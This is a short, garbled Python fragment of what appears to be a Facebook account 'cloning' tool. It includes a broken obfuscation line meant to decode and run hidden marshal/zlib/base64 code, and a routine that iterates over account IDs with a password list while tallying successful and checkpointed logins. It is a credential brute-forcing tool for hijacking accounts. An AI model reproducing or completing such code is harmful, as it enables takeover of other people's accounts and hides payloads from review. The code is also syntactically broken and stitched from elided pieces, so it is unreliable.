...
import codecs
import base64
_ = lambda  : import('marshal').loads(import('zlib').decompress(import('base64').b64decode([::-1])));
...
if select == "1":self.oldClone("2009")
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r{XX}[{G}FB-{ids}{XX}]{G} × {self.loop} × {XX}[{G}OK{XX}]{G} × {len(self.oks)}")
        sys.stdout.flush()
